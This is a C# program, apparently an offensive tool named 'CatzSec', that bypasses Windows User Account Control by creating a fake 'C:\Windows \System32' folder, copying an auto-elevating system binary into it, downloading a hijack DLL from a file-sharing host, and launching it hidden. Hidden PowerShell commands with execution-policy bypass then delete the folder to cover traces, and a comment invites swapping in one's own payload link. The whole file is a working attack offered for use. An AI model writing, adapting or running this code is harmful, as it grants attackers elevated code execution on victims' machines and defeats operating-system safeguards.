using System.Net;
using System.Diagnostics;

public class CatzSec
{
    public static void Main(string[] args ){

        // Change your dll payload link here 
        String payload_link = "https://filebin.net/kq094i793bnovuhx/profapi.dll";

        System.Uri payloadurl = new System.Uri(payload_link);

        var rootDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
        string mockdir = "\\\\?\\" + rootDrive + "Windows \\System32";
        if (Directory.Exists(mockdir)){
            new Process{StartInfo = new ProcessStartInfo{
                FileName = @"powershell.exe",
                Arguments = "-NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass -Command \" Remove-Item '\\\\?\\C:\\Windows \\' -Force -Recurse \"",
                UseShellExecute = true,
            }
            }.Start();
            Environment.Exit(0);
        }
        
        string windowslocation = Environment.SystemDirectory;
        var executeables = new List<string> {"ComputerDefaults.exe", "EASPolicyManagerBrokerHost.exe", "fodhelper.exe", "FXSUNATD.exe", "msconfig.exe", "OptionalFeatures.exe", "sdclt.exe",   "systemreset.exe", "SystemSettingsAdminFlows.exe", "WinSAT.exe",  "WSReset.exe"};
        var dlls = new  List<string>        {"profapi.dll",          "profapi.dll",                    "profapi.dll",   "version.dll",  "version.dll",  "profapi.dll",          "profapi.dll",  "version.dll",    "version.dll",                  "version.dll", "profapi.dll"};
        int chosen = new Random().Next(0, dlls.Count()-1);
        string executeable_name = executeables[chosen];
        string dll_name = dlls[chosen];

        Directory.CreateDirectory(mockdir);
        File.Copy(windowslocation + "\\" + executeable_name, mockdir + "\\" + executeable_name);
        new WebClient().DownloadFile(payloadurl,  mockdir + "\\" + dll_name);
        var proc = new Process{StartInfo = new ProcessStartInfo{
                FileName = @"cmd.exe",
                Arguments = "/c \""+ rootDrive +  "Windows \\System32\\" + executeable_name + "\"",
                UseShellExecute = true,
                RedirectStandardOutput = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            }
        };

        proc.Start();
        Thread.Sleep(3000);
        try {
            proc.Kill();
        } catch (System.InvalidOperationException){}

        new Process{StartInfo = new ProcessStartInfo{
                FileName = @"powershell.exe",
                Arguments = "-NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass -Command \" Remove-Item '\\\\?\\C:\\Windows \\' -Force -Recurse \"",
                UseShellExecute = true,
            }
        }.Start();
    }
}